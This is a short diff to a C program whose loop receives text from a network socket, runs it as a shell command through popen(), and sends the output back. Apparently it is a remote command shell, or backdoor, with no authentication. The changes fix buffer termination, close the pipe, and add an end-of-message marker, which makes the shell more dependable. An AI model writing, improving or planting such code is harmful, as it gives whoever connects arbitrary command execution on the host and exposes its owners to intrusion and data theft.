@@ -72,8 +72,11 @@ int main(){
 
         while(1){
         ssize_t bytesReceived = recv(clientSocket, buffer, BUFFER_SIZE - 1, 0);
+       
 
         if(bytesReceived > 0){
+
+             buffer[bytesReceived] = '\0';
 
             FILE *pipe = popen(buffer, "r");
 
@@ -82,6 +85,11 @@ int main(){
             while(fgets(commandOutput, sizeof(commandOutput), pipe) != NULL){
                send(clientSocket, commandOutput, strlen(commandOutput), 0);
             }
+
+            pclose(pipe);
+
+            //End of message
+            send(clientSocket, "$#@!", strlen("$#@!"), 0);
 
 
         }
